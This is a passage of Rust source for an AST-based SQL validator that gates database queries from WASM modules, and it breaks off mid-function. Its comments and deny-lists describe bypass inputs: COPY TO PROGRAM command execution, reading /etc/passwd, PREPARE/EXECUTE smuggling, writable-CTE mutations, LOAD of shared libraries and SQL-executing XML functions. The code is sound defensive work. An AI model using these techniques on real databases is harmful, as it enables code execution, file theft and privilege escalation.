//! AST-based SQL validation for WASM database access.
//!
//! Replaces the previous pattern-based approach (semicolons, comment detection,
//! first-keyword extraction) with a proper SQL parser that understands the full
//! PostgreSQL grammar. This catches evasion techniques like:
//!
//! - `WITH x AS (DELETE FROM t RETURNING *) SELECT * FROM x` (CTE mutation)
//! - Obfuscated DDL via whitespace/comment tricks
//! - Multi-statement injection via parser-confusing syntax
//!
//! If parsing fails, the query is rejected (fail-closed).

use sqlparser::ast::{self, Statement};
use sqlparser::dialect::PostgreSqlDialect;
use sqlparser::parser::Parser;
use std::fmt;

/// Errors from SQL validation.
#[derive(Debug)]
pub enum SqlValidationError {
    /// The SQL could not be parsed. Fail-closed: if we can't understand it, we don't run it.
    ParseError(String),
    /// More than one statement was found (multi-statement injection).
    MultipleStatements,
    /// A DDL statement (CREATE, DROP, ALTER, TRUNCATE) was detected.
    DdlBlocked(String),
    /// The statement type is not in the allowed operations list.
    DisallowedOperation(String),
    /// A CTE body contains a mutating statement not permitted by the allowlist.
    CteMutationBlocked(String),
    /// MCP-472: A statement type was rejected by the unconditional
    /// deny-list. These statements have no legitimate use from WASM
    /// modules and carry concrete escalation risk (e.g. `COPY ... TO
    /// PROGRAM` is RCE on the DB host; `SET ROLE` is privilege
    /// escalation if the connection has that capability; `LISTEN /
    /// NOTIFY` are inter-session side channels). Blocked regardless of
    /// `allowed_operations` content.
    AlwaysBlocked(String),
    /// MCP-519: the parser produced a `Statement` variant that the
    /// validator has no explicit classification for. Fail-closed
    /// because the prior `_ => "UNKNOWN"` fall-through silently
    /// admitted Create*/Drop*/Alter* variants the parser had grown
    /// beyond the enumerated set (e.g. `CreatePolicy`,
    /// `CreateDatabase`, `DropPolicy`, `AlterPolicy`). Any unhandled
    /// statement is treated as a potential bypass — operators
    /// observing this error in production should file an issue so
    /// the variant can be classified.
    UnknownStatement,
    /// The statement calls a function the allow list does not admit
    /// (`talos_workflow_job_protocol::is_allowed_sql_function`; a deny
    /// list until 2026-10-08). The statement-level gates cannot see a
    /// function call inside a `SELECT`. The contained string is the
    /// function's name as written, lower-cased where Postgres folds it
    /// (`pg_sleep`, `pg_catalog.pg_sleep`, `public.f`, `"F"`).
    DisallowedFunction(String),
}

impl fmt::Display for SqlValidationError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ParseError(msg) => write!(f, "SQL parse error: {}", msg),
            Self::MultipleStatements => {
                write!(f, "Multiple SQL statements per query are not allowed")
            }
            Self::DdlBlocked(stmt) => {
                write!(f, "{} statements are blocked by security policy", stmt)
            }
            Self::DisallowedOperation(stmt) => {
                write!(f, "{} is not in the allowed SQL operations list", stmt)
            }
            Self::CteMutationBlocked(stmt) => write!(
                f,
                "CTE contains a {} operation not permitted by the allowlist",
                stmt
            ),
            Self::AlwaysBlocked(stmt) => write!(
                f,
                "{} statements are unconditionally blocked from WASM modules \
                 (no allowlist override) — see security policy",
                stmt
            ),
            Self::UnknownStatement => write!(
                f,
                "SQL statement type is not classified by the worker validator \
                 — rejected fail-closed. If this is a legitimate operation, \
                 file an issue so the variant can be classified.",
            ),
            Self::DisallowedFunction(name) => write!(
                f,
                "SQL calls function `{name}`, which is not on the list of \
                 functions module SQL may call (talos_workflow_job_protocol::\
                 ALLOWED_SQL_FUNCTIONS: a bare or pg_catalog-qualified name of a \
                 function that changes nothing, reads nothing stored beyond its \
                 arguments and runs no SQL). It is rejected from WASM modules \
                 regardless of `allowed_sql_operations`."
            ),
        }
    }
}

/// Classify a parsed statement into a canonical type name (SELECT, INSERT, etc.).
///
/// MCP-519: every Create* / Drop* / Alter* variant exposed by
/// sqlparser must classify as DDL — pre-fix several PostgreSQL DDL
/// variants (`CreatePolicy`, `CreateDatabase`, `DropPolicy`,
/// `DropFunction`, `DropProcedure`, `DropTrigger`, `AlterPolicy`, …)
/// fell to the `_ => "UNKNOWN"` arm. Combined with the documented
/// "empty allowlist = no restriction beyond DDL" contract this meant
/// a WASM module with empty `allowed_sql_operations` AND the
/// database world could submit `CREATE POLICY ... USING (true)` to
/// grant cross-row visibility on RLS tables, or `DROP POLICY` to
/// strip an existing RLS row-filter — neither of which appeared as
/// DDL to `is_ddl()`. The `_ => UNKNOWN` arm in
/// `always_blocked_label` then also let DuckDB / Hive / Snowflake
/// dialects' `LOAD extension`, `INSTALL`, `LockTables`, `Use`,
/// `Pragma`, `AttachDatabase`, and `Kill` slip past unconditionally
/// (they parse with PostgreSqlDialect because sqlparser shares the
/// parser layer across dialects).
///
/// Two-layer defense: each new variant is enumerated below AND the
/// catch-all `_` is removed by replacing it with an explicit
/// `"UNKNOWN"` arm that the validator's caller now treats as a
/// fail-closed signal (`UnknownStatement` error variant).
fn statement_type(stmt: &Statement) -> &'static str {
    match stmt {
        Statement::Query(_) => "SELECT",
        Statement::Insert(_) => "INSERT",
        Statement::Update { .. } => "UPDATE",
        Statement::Delete(_) => "DELETE",
        Statement::Copy { .. } => "COPY",
        Statement::CopyIntoSnowflake { .. } => "COPY",
        Statement::Merge { .. } => "MERGE",
        Statement::Call(_) => "CALL",
        Statement::Explain { .. } | Statement::ExplainTable { .. } => "EXPLAIN",
        // CREATE — every Create* variant the parser exposes. New
        // variants in a future sqlparser bump are caught by the
        // `Unknown` fail-closed default below.
        Statement::CreateTable { .. }
        | Statement::CreateView { .. }
        | Statement::CreateVirtualTable { .. }
        | Statement::CreateIndex(_)
        | Statement::CreateSchema { .. }
        | Statement::CreateDatabase { .. }
        | Statement::CreateSequence { .. }
        | Statement::CreateType { .. }
        | Statement::CreateRole { .. }
        | Statement::CreateExtension { .. }
        | Statement::CreateFunction { .. }
        | Statement::CreateProcedure { .. }
        | Statement::CreateTrigger { .. }
        | Statement::CreatePolicy { .. }
        | Statement::CreateSecret { .. }
        | Statement::CreateMacro { .. }
        | Statement::CreateStage { .. }
        // Statement kinds sqlparser gained between 0.53 and 0.63.
        | Statement::CreateCollation { .. }
        | Statement::CreateConnector(_)
        | Statement::CreateDomain(_)
        | Statement::CreateFileFormat { .. }
        | Statement::CreateOperator(_)
        | Statement::CreateOperatorClass(_)
        | Statement::CreateOperatorFamily(_)
        | Statement::CreateServer(_)
        | Statement::CreateTextSearch(_)
        | Statement::CreateUser(_)
        | Statement::CreateWarehouse { .. } => "CREATE",
        // DROP — `Statement::Drop` is the generic form (DROP TABLE /
        // VIEW / etc.); each specialised Drop* variant maps here too
        // so the DDL gate fires.
        Statement::Drop { .. }
        | Statement::DropFunction { .. }
        | Statement::DropProcedure { .. }
        | Statement::DropSecret { .. }
        | Statement::DropPolicy { .. }
        | Statement::DropTrigger { .. }
        | Statement::DropConnector { .. }
        | Statement::DropDomain(_)
        | Statement::DropExtension(_)
        | Statement::DropOperator(_)
        | Statement::DropOperatorClass(_)
        | Statement::DropOperatorFamily(_) => "DROP",
        // ALTER — every Alter* the parser knows about.
        Statement::AlterTable { .. }
        | Statement::AlterIndex { .. }
        | Statement::AlterView { .. }
        | Statement::AlterRole { .. }
        | Statement::AlterPolicy { .. }
        | Statement::AlterCollation(_)
        | Statement::AlterConnector { .. }
        | Statement::AlterFunction(_)
        | Statement::AlterOperator(_)
        | Statement::AlterOperatorClass(_)
        | Statement::AlterOperatorFamily(_)
        | Statement::AlterSchema(_)
        | Statement::AlterSession { .. }
        | Statement::AlterTextSearch(_)
        | Statement::AlterType(_)
        | Statement::AlterUser(_) => "ALTER",
        Statement::Truncate { .. } => "TRUNCATE",
        // Grant/Revoke
        Statement::Grant { .. } => "GRANT",
        Statement::Revoke { .. } => "REVOKE",
        // ATTACH / DETACH — modify which databases are accessible
        // for the rest of the session. Classed as DDL so the DDL
        // gate fires unconditionally.
        Statement::AttachDatabase { .. }
        | Statement::AttachDuckDBDatabase { .. }
        | Statement::DetachDuckDBDatabase { .. } => "ATTACH",
        // Fail-closed default. Any new sqlparser Statement variant
        // not enumerated above lands here. The caller maps this to
        // `SqlValidationError::UnknownStatement` and rejects the
        // query — restoring the AST-validator's fail-closed contract
        // that pre-MCP-519 was silently broken for every Create* /
        // Drop* / Alter* / extension-load class the parser had grown.
        _ => "UNKNOWN",
    }
}

/// Check whether a statement is DDL (schema-modifying).
fn is_ddl(stmt: &Statement) -> bool {
    matches!(
        statement_type(stmt),
        "CREATE" | "DROP" | "ALTER" | "TRUNCATE" | "GRANT" | "REVOKE"
    )
}

/// MCP-472: classify a parsed statement as unconditionally blocked,
/// returning the canonical label for the error message. None means the
/// statement is not on the deny-list (the regular DDL / allowlist
/// checks still apply downstream).
///
/// These statement types have NO legitimate use from a WASM module
/// and each carries concrete escalation risk that the existing DDL +
/// allowlist gates miss:
///
/// * `COPY` — `COPY ... TO PROGRAM 'cmd'` is RCE on the DB host;
///   `COPY ... FROM '/etc/passwd'` is a local file read on the DB host.
///   Both parse successfully and currently fall to "UNKNOWN" →
///   pass-through when `allowed_operations` is empty.
/// * `SET ROLE` / `SET search_path` / generic `SET` / `RESET` /
///   `SHOW` — session-level state mutation that can pivot privileges
///   or change query semantics for the rest of the connection.
/// * `LISTEN` / `NOTIFY` / `UNLISTEN` — Postgres inter-session
///   pub/sub. Modules have no business signalling other sessions.
/// * `PREPARE` / `EXECUTE` / `DEALLOCATE` — `PREPARE foo AS DELETE
///   FROM secrets; EXECUTE foo` smuggles a mutation past the
///   allowlist (the prepared statement body isn't introspected by
///   `validate_sql` when only the EXECUTE is later sent).
/// * Transaction control (`START TRANSACTION` / `COMMIT` /
///   `ROLLBACK` / `SAVEPOINT` / `RELEASE SAVEPOINT`) — the worker
///   owns transaction boundaries; guest code must not open or close
///   one.
/// * `DISCARD` — clears cached plans / session state including
///   prepared statements the platform may depend on.
/// * `Use` — DB switch (not PostgreSQL but parsable; defensive).
///
/// Empty allowlist callers were previously allowed every non-DDL
/// statement type by design ("no allowlist = no restriction beyond
/// DDL"); this deny-list keeps that lenient default intact for
/// INSERT / UPDATE / DELETE / SELECT while closing the high-risk
/// statement types regardless of allowlist content.
fn always_blocked_label(stmt: &Statement) -> Option<&'static str> {
    match stmt {
        Statement::Copy { .. } | Statement::CopyIntoSnowflake { .. } => Some("COPY"),
        // EXPLAIN is blocked unconditionally to match the controller's
        // `controller_permits_data_statement` (talos-rpc-subscribers), which
        // admits only Query/Insert/Update/Delete/Merge. `EXPLAIN ANALYZE
        // <stmt>` EXECUTES its inner statement, so classifying EXPLAIN as a
        // harmless read-only op (its previous treatment) would green-light
        // `EXPLAIN ANALYZE INSERT …` / `EXPLAIN ANALYZE CREATE TABLE … AS
        // SELECT` past the worker validator. The controller catches it today,
        // but the worker is the documented PRIMARY fence and must not be
        // strictly weaker. (Plain `EXPLAIN SELECT` is collateral — it never
        // worked end-to-end since the controller already rejects all EXPLAIN.)
        Statement::Explain { .. } | Statement::ExplainTable { .. } => Some("EXPLAIN"),
        // Every `SET` is one `Statement::Set` from sqlparser 0.54. The label
        // names the sub-kind for the error text; all of them are blocked, and
        // a sub-kind a later sqlparser adds is blocked as plain `SET`.
        Statement::Set(set) => Some(match set {
            ast::Set::SetRole { .. } => "SET ROLE",
            ast::Set::SetTimeZone { .. } => "SET TIME ZONE",
            ast::Set::SetNamesDefault { .. } | ast::Set::SetNames { .. } => "SET NAMES",
            ast::Set::SetTransaction { .. } => "SET TRANSACTION",
            ast::Set::SetSessionAuthorization(_) => "SET SESSION AUTHORIZATION",
            _ => "SET",
        }),
        Statement::Reset(_) => Some("RESET"),
        Statement::ShowVariable { .. }
        | Statement::ShowStatus { .. }
        | Statement::ShowVariables { .. }
        | Statement::ShowCreate { .. }
        | Statement::ShowColumns { .. }
        | Statement::ShowTables { .. }
        | Statement::ShowDatabases { .. }
        | Statement::ShowSchemas { .. }
        | Statement::ShowViews { .. }
        | Statement::ShowCollation { .. }
        | Statement::ShowFunctions { .. }
        | Statement::ShowCatalogs { .. }
        | Statement::ShowCharset { .. }
        | Statement::ShowObjects { .. }
        | Statement::ShowProcessList { .. } => Some("SHOW"),
        Statement::LISTEN { .. } => Some("LISTEN"),
        Statement::NOTIFY { .. } => Some("NOTIFY"),
        Statement::UNLISTEN { .. } => Some("UNLISTEN"),
        Statement::Prepare { .. } => Some("PREPARE"),
        Statement::Execute { .. } => Some("EXECUTE"),
        Statement::Deallocate { .. } => Some("DEALLOCATE"),
        Statement::StartTransaction { .. } => Some("START TRANSACTION"),
        Statement::Commit { .. } => Some("COMMIT"),
        Statement::Rollback { .. } => Some("ROLLBACK"),
        Statement::Savepoint { .. } => Some("SAVEPOINT"),
        Statement::ReleaseSavepoint { .. } => Some("RELEASE SAVEPOINT"),
        Statement::Discard { .. } => Some("DISCARD"),
        Statement::Use(_) => Some("USE"),
        // MCP-519: the following statement types parse with
        // PostgreSqlDialect (sqlparser shares the parser layer
        // across dialects) and previously fell to the
        // statement_type "UNKNOWN" bucket — bypassing both is_ddl
        // and the deny-list, then passing under empty
        // `allowed_operations`. Each one carries concrete
        // escalation / sandbox-escape risk from a WASM module:
        //
        // * `LOAD 'libfoo.so'` (Postgres) / `LOAD extension` (DuckDB)
        //   — loads a shared library / extension at runtime, RCE on
        //   the database host.
        // * `INSTALL extension` (DuckDB) — downloads + installs an
        //   extension; same RCE class.
        // * `Pragma` — SQLite-flavored session/database knobs;
        //   parses but is meaningless under PG. Deny so a future
        //   dialect-mix doesn't silently honor it.
        // * `LockTables` / `UnlockTables` — session-wide table
        //   locks; module has no business holding them.
        // * `Kill` — terminates other Postgres backends.
        // * `Comment` — PostgreSQL `COMMENT ON ...` is DDL-adjacent
        //   (metadata mutation); not on `is_ddl` but harmful
        //   enough to deny.
        // * `Declare` / `Fetch` / `Close` — server-side cursors;
        //   module's connection is short-lived so these are dead
        //   weight at best, hold-locks-open footgun at worst.
        // * `Flush` / `OptimizeTable` / `Msck` / `Cache` / `UNCache`
        //   — dialect-specific maintenance ops with no legitimate
        //   guest use.
        // * `Directory` (Hive), `Unload` / `LoadData` (warehouse
        //   data movement), `Assert` (SQL assertions) — same.
        Statement::Load { .. } => Some("LOAD"),
        Statement::Install { .. } => Some("INSTALL"),
        Statement::Pragma { .. } => Some("PRAGMA"),
        Statement::LockTables { .. } => Some("LOCK TABLES"),
        // sqlparser 0.63 parses these; 0.53 refused them at the parser. The
        // PostgreSQL `LOCK TABLE`, `VACUUM` and a cursor `OPEN` are session
        // and maintenance operations a module has no business issuing.
        Statement::Lock(_) => Some("LOCK"),
        Statement::Vacuum(_) => Some("VACUUM"),
        Statement::Open(_) => Some("OPEN"),
        Statement::UnlockTables => Some("UNLOCK TABLES"),
        Statement::Kill { .. } => Some("KILL"),
        Statement::Comment { .. } => Some("COMMENT"),
        Statement::Declare { .. } => Some("DECLARE"),
        Statement::Fetch { .. } => Some("FETCH"),
        Statement::Close { .. } => Some("CLOSE"),
        Statement::Flush { .. } => Some("FLUSH"),
        Statement::OptimizeTable { .. } => Some("OPTIMIZE TABLE"),
        Statement::Msck { .. } => Some("MSCK"),
        Statement::Cache { .. } => Some("CACHE"),
        Statement::UNCache { .. } => Some("UNCACHE"),
        Statement::Directory { .. } => Some("DIRECTORY"),
        Statement::Unload { .. } => Some("UNLOAD"),
        Statement::LoadData { .. } => Some("LOAD DATA"),
        Statement::Assert { .. } => Some("ASSERT"),
        _ => None,
    }
}

/// Admit every statement the root CARRIES on the terms a top-level statement
/// of its kind would be admitted.
///
/// PostgreSQL lets a statement sit inside another:
/// ```sql
/// WITH deleted AS (DELETE FROM t RETURNING *) SELECT * FROM deleted
/// WITH src AS (SELECT 1 AS a) UPDATE t SET a = (SELECT a FROM src) RETURNING a
/// ```
/// sqlparser hands both over as a `Statement::Query`, labelled `"SELECT"`, so
/// the allowlist check on the root's label never sees the write.
///
/// # This is the third version of this function, and the first that is not a list
///
/// The first looked at the top-level CTE bodies. MCP-554 added nested CTEs and
/// derived tables. Both were walks over the positions someone had thought of,
/// and on 2026-10-06 a corpus of statements found eleven more that the walk
/// admitted with NO operation granted. One is the second statement above,
/// which PostgreSQL runs (measured through the controller's handler in
/// `controller/tests/rpc_write_ceiling_tests.rs`): the body of the query a
/// `WITH` introduces was never looked at, nor a subquery in `WHERE`, the
/// select list, `ORDER BY` or `LIMIT`.
///
/// It now asks `talos_sql_classify::try_for_each_carried_statement`, the walk
/// the read/write classifier is built on, which rides sqlparser's own derived
/// visitor and so reaches every position a statement can occupy — including
/// ones a later sqlparser adds. A carried statement is put through the same
/// gates as a root: DDL, the always-blocked list, the unknown-kind refusal,
/// then the allowlist.
fn check_carried_statements(
    stmt: &Statement,
    allowed_operations: &[String],
    empty_policy: EmptyAllowlistPolicy,
) -> Result<(), SqlValidationError> {
    use std::ops::ControlFlow;
    let walked = talos_sql_classify::try_for_each_carried_statement(stmt, |carried| {
        match admit_carried_statement(carried, allowed_operations, empty_policy) {
            Ok(()) => ControlFlow::Continue(()),
            Err(refusal) => ControlFlow::Break(refusal),
        }
    });
    match walked {
        ControlFlow::Break(refusal) => Err(refusal),
        ControlFlow::Continue(()) => Ok(()),
    }
}

fn admit_carried_statement(
    carried: &Statement,
    allowed_operations: &[String],
    empty_policy: EmptyAllowlistPolicy,
) -> Result<(), SqlValidationError> {
    let kind = statement_type(carried);
    if is_ddl(carried) {
        return Err(SqlValidationError::DdlBlocked(kind.to_string()));
    }
    if let Some(label) = always_blocked_label(carried) {
        return Err(SqlValidationError::AlwaysBlocked(label.to_string()));
    }
    if kind == "UNKNOWN" {
        return Err(SqlValidationError::UnknownStatement);
    }
    enforce_cte_mutation_policy(kind, allowed_operations, empty_policy)
}

/// # An empty allowlist meant "anything, as long as you hide it in a CTE"
///
/// The allowlist test below used to be the WHOLE function body after the DDL
/// guard, wrapped in `if !allowed_operations.is_empty()`. So an EMPTY
/// allowlist fell straight through to `Ok(())` and a writable CTE was
/// admitted — while the top-level path, twenty lines further down in
/// `validate_sql_with_policy`, refuses a bare `INSERT` under exactly the same
/// configuration (`DenyMutations` is the production default and its documented
/// contract is "only SELECT passes when the allowlist is empty").
///
/// That was not a corner case: `allowed_sql_operations` is hardcoded to
/// `vec![]` at EVERY dispatch site in the workspace
/// (`engine_dispatch_single`, `engine_dispatch_pipeline`, `scheduler_handlers`,
/// and the gmail / google-cloud module dispatchers), so the empty allowlist is
/// the ONLY configuration that exists in the fleet. Measured on the pre-fix
/// tree: `WITH ins AS (INSERT INTO t (a) VALUES (1) RETURNING a) SELECT * FROM ins`
/// validated clean with `allowed_operations = []`.
///
/// The empty case now takes the SAME branch the top-level path takes, so a
/// mutation is admitted only where a top-level mutation would be.
fn enforce_cte_mutation_policy(
    cte_stmt_type: &str,
    allowed_operations: &[String],
    empty_policy: EmptyAllowlistPolicy,
) -> Result<(), SqlValidationError> {
    // DDL inside CTEs is not valid PostgreSQL, but block it defensively.
    if cte_stmt_type == "CREATE"
        || cte_stmt_type == "DROP"
        || cte_stmt_type == "ALTER"
        || cte_stmt_type == "TRUNCATE"
    {
        return Err(SqlValidationError::DdlBlocked(cte_stmt_type.to_string()));
    }
    // Check against the allowlist. An EMPTY allowlist is not "no opinion": it
    // resolves through the same `EmptyAllowlistPolicy` the top-level statement
    // check uses, so `DenyMutations` (the production default) refuses here too.
    if allowed_operations.is_empty() {
        return match empty_policy {
            EmptyAllowlistPolicy::DenyMutations => Err(SqlValidationError::CteMutationBlocked(
                cte_stmt_type.to_string(),
            )),
            // Legacy permissive mode admits top-level non-DDL mutations, so it
            // admits them inside a CTE too — same answer to the same question.
            EmptyAllowlistPolicy::AllowAllNonDdl => Ok(()),
        };
    }
    let permitted = allowed_operations
        .iter()
        .any(|op| op.eq_ignore_ascii_case(cte_stmt_type));
    if !permitted {
        return Err(SqlValidationError::CteMutationBlocked(
            cte_stmt_type.to_string(),
        ));
    }
    Ok(())
}

/// Which functions a statement may call: only those
/// `talos_workflow_job_protocol::is_allowed_sql_function` admits (2026-10-08).
///
/// The statement-level gates (`always_blocked_label`, `is_ddl`) cannot see
/// a function call inside a `SELECT`, and a function can read the server's
/// files, end another session, sleep out the budget, or run SQL handed to
/// it as text. Until 2026-10-08 this asked a DENY list; a function nobody
/// had read about was admitted, and two that run SQL were missed for a
/// year (`docs/engineering-log/packages/2026-10-08-sql-deny-list-text-search-evaluators.md`).
/// It now asks the allow list, so such a function is refused.
///
/// The walk is `talos_sql_classify::first_function_not_admitted`, the one
/// the controller's re-parse and the `query_paginated` gate ask too: calls
/// in any expression, set-returning functions in FROM, the nameless table
/// factors (`XMLTABLE`, `UNNEST`), and calls held outside an expression. A
/// bare or `pg_catalog`-qualified name is admitted when its function is
/// listed; a name in any other schema (`public.lower`), a quoted name
/// (`"LOWER"`), and a name that is not plain identifiers are refused.
///
/// **Cost.** Linear in the number of AST nodes, stopping at the first
/// refused call.
fn check_called_functions(stmt: &Statement) -> Result<(), SqlValidationError> {
    match talos_sql_classify::first_function_not_admitted(
        stmt,
        talos_workflow_job_protocol::is_allowed_sql_function,
    ) {
        Some(name) => Err(SqlValidationError::DisallowedFunction(name)),
        None => Ok(()),
    }
}

/// Worker-local supplement to the canonical
/// `talos_workflow_job_protocol::DISALLOWED_SQL_FUNCTIONS` deny-list.
///
/// The SQL/XML mapping family (`xml.c`) takes a QUERY or a TABLE/SCHEMA/
/// DATABASE name and executes SQL on the caller's behalf through SPI —
/// `query_to_xml('DELETE FROM …', …)` runs the string it is handed, and
/// `database_to_xml(...)` walks every table the role can read. That is a
/// second SQL interpreter inside a statement the AST walker has already
/// classified as a plain `SELECT`, so the statement-shape classifier, the
/// CTE-mutation walker and the allowlist all see a read while the server
/// performs whatever the string says. Denied by name, both bare and
/// `pg_catalog`-qualified, exactly like the canonical list.
///
/// `xmltable` is included for the same conservatism: it is an XML/XPath
/// evaluator over caller-shaped input rather than an SPI executor, but it has
/// no place in guest SQL and shares the family's surface.
///
/// Lives HERE rather than in the protocol crate only because that crate is
/// owned separately; fold it into `DISALLOWED_SQL_FUNCTIONS` when that list is
/// next edited, and delete this one.
#[cfg(test)]
pub(crate) const WORKER_DISALLOWED_SQL_FUNCTIONS: &[&str] = &[
    "query_to_xml",
    "query_to_xmlschema",
    "query_to_xml_and_xmlschema",
    "cursor_to_xml",
    "cursor_to_xmlschema",
    "table_to_xml",
    "table_to_xmlschema",
    "table_to_xml_and_xmlschema",
    "schema_to_xml",
    "schema_to_xmlschema",
    "schema_to_xml_and_xmlschema",
    "database_to_xml",
    "database_to_xmlschema",
    "database_to_xml_and_xmlschema",
    "xmltable",
];

/// Validate a SQL statement against the security policy.
///
/// Outcome of a successful [`validate_sql`] call.
///
/// `stmt_type` is the canonical statement-type name (`"SELECT"`,
/// `"INSERT"`, `"UPDATE"`, etc.) matching the legacy String return.
///
/// `returns_rows` (MCP-578) is true iff the statement actually emits
/// rows the worker should consume via `fetch_all`-shape: SELECT,
/// or a DML statement with a real `RETURNING` clause as detected
/// from the AST. Pre-existing `is_fetch` detection in
/// `host_impl::execute_query` used a substring `.contains("RETURNING")`
/// check that produced false-positives on string literals
/// (`INSERT INTO logs (msg) VALUES ('user returning home')`) and
/// identifier substrings (`UPDATE u SET returning_user = 1`). A
/// false-positive caused the controller to wrap the DML in a CTE
/// `WITH x AS (...) SELECT FROM x` which Postgres rejects with
/// "WITH query has no RETURNING clause" — the DML never runs and
/// the operator sees an opaque error instead of their INSERT
/// completing. AST-based detection eliminates the false-positive
/// without affecting the false-negative case (no impact: real
/// `RETURNING` queries continue to fetch).
#[derive(Debug, Clone)]
pub struct ValidatedStmt {
    pub stmt_type: String,
    pub returns_rows: bool,
    /// Does this statement MUTATE? Answered by `talos_sql_classify`, the ONE
    /// implementation of that question in the workspace — the same function
    /// the controller's `talos.database.query` handler calls.
    ///
    /// It is deliberately NOT derived from [`Self::stmt_type`]. That field is
    /// a top-level LABEL for the allowlist, the audit target and error text;
    /// `WITH ins AS (INSERT … RETURNING a) SELECT * FROM ins` is labelled
    /// `"SELECT"` because its root really is a `Statement::Query`. Reading
    /// read-only-ness off the label is what let a `readonly` actor's INSERT
    /// through — see `talos_sql_classify`'s module docs.
    ///
    /// Computed from the AST this function already parsed, so the classifier
    /// costs a tree walk, not a second parse.
    pub access: talos_sql_classify::SqlAccess,
}

/// AST-based check for whether a statement actually emits rows.
/// SELECT does. INSERT/UPDATE/DELETE/MERGE only do if they carry a real
/// `RETURNING` clause.
/// Everything else (EXPLAIN, CALL, etc.) is treated as non-row-emitting
/// for routing purposes — the AST gate above already rejected DDL
/// and the deny-list catches the dangerous ones.
fn statement_returns_rows(stmt: &Statement) -> bool {
    use sqlparser::ast::Statement as S;
    match stmt {
        S::Query(_) => true,
        S::Insert(ins) => !ins.returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Update(upd) => !upd.returning.as_deref().unwrap_or(&[]).is_empty(),
        S::Delete(del) => !del.returning.as_deref().unwrap_or(&[]).is_empty(),
        // PostgreSQL 17 has `MERGE … RETURNING`, and sqlparser parses it from
        // 0.54 (as the statement's output clause).
        S::Merge(merge) => merge.output.is_some(),
        // EXPLAIN would emit analysis rows, but `always_blocked_label`
        // rejects it before routing — this arm is unreachable via
        // `validate_sql` and kept only so the pure classifier stays correct.
        S::Explain { .. } | S::ExplainTable { .. } => true,
        _ => false,
    }
}

/// Policy governing how an EMPTY `allowed_operations` slice is
/// interpreted by [`validate_sql_with_policy`].
///
/// M-3 (2026-05-22): the legacy `validate_sql` contract treated an
/// empty allowlist as "no restriction beyond DDL / always-blocked".
/// That made INSERT / UPDATE / DELETE / MERGE / CALL permitted by
/// default — which is a footgun if the controller dispatches a
/// database-node job without explicitly setting `allowed_sql_operations`.
/// The new default ([`DenyMutations`](Self::DenyMutations)) is
/// least-privilege: empty allowlist permits only SELECT. To enable
/// mutations, the controller MUST dispatch a JobRequest with an explicit
/// allowlist. (EXPLAIN is unconditionally blocked — see
/// `always_blocked_label`.)
///
/// Operators with workflows that depend on the legacy permissive
/// behaviour can opt back in with
/// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1`. Auditable in operator
/// startup logs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum EmptyAllowlistPolicy {
    /// Empty allowlist permits only SELECT (the sole read-only statement
    /// type that passes; EXPLAIN is unconditionally blocked). All mutations
    /// require an explicit allowlist entry. The default in production.
    DenyMutations,
    /// Empty allowlist permits every non-DDL non-AlwaysBlocked
    /// statement. The pre-M-3 behaviour. Legacy compatibility only;
    /// `TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST=1` opts back in.
    AllowAllNonDdl,
}

impl EmptyAllowlistPolicy {
    /// Resolve the policy from the worker's environment. Default is
    /// `DenyMutations`. Truthy values that flip to legacy permissive
    /// mode: `1` / `true` / `yes` (case-insensitive).
    pub fn from_env() -> Self {
        if talos_config::bool_env_or_default("TALOS_SQL_PERMISSIVE_EMPTY_ALLOWLIST", false) {
            Self::AllowAllNonDdl
        } else {
            Self::DenyMutations
        }
    }
}

/// Returns `Ok(ValidatedStmt)` describing the statement on success,
/// or `Err(SqlValidationError)` if the query violates the policy.
///
/// Calls [`validate_sql_with_policy`] with the operator-configured
/// [`EmptyAllowlistPolicy::from_env`] policy — the default in
/// production is `DenyMutations`. Pass an explicit policy via
/// [`validate_sql_with_policy`] in tests / call sites that need
/// repeatable behaviour.
///
/// Security properties:
/// - **Fail-closed**: If the SQL cannot be parsed, it is rejected.
/// - **Single-statement**: Only one statement per query is allowed.
/// - **DDL blocked**: CREATE, DROP, ALTER, TRUNCATE, GRANT, REVOKE are always rejected.
/// - **Allowlist enforcement** (default `DenyMutations`):
///     - Non-empty allowlist: only listed types plus SELECT/EXPLAIN are permitted.
///     - Empty allowlist: only SELECT/EXPLAIN are permitted.
/// - **CTE mutation detection**: Writable CTEs are checked against the allowlist.
pub fn validate_sql(
    sql: &str,
    allowed_operations: &[String],
) -> Result<ValidatedStmt, SqlValidationError> {
    validate_sql_with_policy(sql, allowed_operations, empty_allowlist_policy())
}

/// Cached resolution of [`EmptyAllowlistPolicy::from_env`] so the env
/// lookup happens once at first use, not on every host-fn call.
fn empty_allowlist_policy() -> EmptyAllowlistPolicy {
    use std::sync::OnceLock;
    static POLICY: OnceLock<EmptyAllowlistPolicy> = OnceLock::new();
    *POLICY.get_or_init(EmptyAllowlistPolicy::from_env)
}

/// Same as [`validate_sql`] but takes an explicit
/// [`EmptyAllowlistPolicy`] instead of reading the operator env var.
/// Used by tests and by call sites that need to override the default.
pub fn validate_sql_with_policy(
    sql: &str,
    allowed_operations: &[String],
    empty_policy: EmptyAllowlistPolicy,
) -> Result<ValidatedStmt, SqlValidationError> {
    let dialect = PostgreSqlDialect {};

    let statements = Parser::parse_sql(&dialect, sql).map_err(|e| {
        SqlValidationError::ParseError(format!(
            "Failed to parse SQL (query rejected for safety): {}",
            e
        ))
    })?;

    // Reject multi-statement batches
    if statements.len() != 1 {
        if statements.is_empty() {
            return Err(SqlValidationError::ParseError(
                "Empty SQL statement".to_string(),
            ));
        }
        return Err(SqlValidationError::MultipleStatements);
    }

    let stmt = &statements[0];
    let stmt_type = statement_type(stmt);

    // Always block DDL — WASM modules must never modify schema
    if is_ddl(stmt) {
        return Err(SqlValidationError::DdlBlocked(stmt_type.to_string()));
    }
    // `SELECT … INTO new_table` creates a table and parses as a plain query,
    // so `is_ddl` (which reads the statement's kind) cannot see it.
    if talos_sql_classify::selects_into_table(stmt) {
        return Err(SqlValidationError::DdlBlocked("SELECT INTO".to_string()));
    }

    // MCP-472: deny-list of high-risk statement types that have no
    // legitimate use from a WASM module. Runs BEFORE the allowlist
    // branch so empty-allowlist callers (the documented "no
    // restriction beyond DDL" mode) still get protected. See
    // `always_blocked_label` for the per-statement-type rationale.
    if let Some(label) = always_blocked_label(stmt) {
        return Err(SqlValidationError::AlwaysBlocked(label.to_string()));
    }

